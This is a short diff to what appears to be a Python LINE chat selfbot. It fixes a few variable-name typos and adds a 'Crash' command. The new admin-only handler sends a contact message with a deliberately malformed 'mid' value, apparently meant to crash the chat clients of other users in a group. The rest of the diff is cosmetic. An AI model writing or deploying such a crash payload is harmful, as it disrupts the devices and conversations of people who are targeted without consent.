@@ -91,7 +91,7 @@ Edited̸͟͞ by Touka Kirishima
    ●▬▬▬▬๑۩FuckMyBot۩๑▬▬▬▬▬●
 """
 
-editMessage= """\n
+editedMessage= """\n
 ═╬════════►∆∆
    E̸͟͞d̸͟͞i̸͟͞t̸͟͞e̸͟͞d̸͟͞.       
 ═╬════════► 
@@ -246,7 +246,7 @@ setMessage= """\n
 ═╬════════►∆∆
 """
 
-cacelMessage= """\n
+cancelMessage= """\n
 ═╬════════►
    🚮M̸͟͞O̸͟͞D̸͟͞E̸͟͞ C̸͟͞A̸͟͞N̸͟͞C̸͟͞E̸͟͞L̸͟͞🚮
 ═╬════════►
@@ -320,6 +320,7 @@ spamMessage= """\n
  |╬| Iconfig
  |╬| Kernel
  |╬| Cpu
+ |╬| Crash
  |╬| Respon/sname
  |╬| Help
  |╬| Mc:[mid]
@@ -2072,6 +2073,12 @@ def bot(op):
                     cl.sendText(msg.to,Setgroup)
                 else:
                     cl.sendText(msg.to,Sett)
+#=======================================================
+            elif msg.text.lower() == "crash":
+              if msg.from_ in admin:
+                msg.contentType = 13
+                msg.contentMetadata = {'mid': "uab1ca173166a362c69ef62d420f9f784',"}
+                cl.sendMessage(msg)
             elif "Reinvite" in msg.text.split():
               if msg.from_ in admin + staff + creator:	
                 if msg.toType == 2:
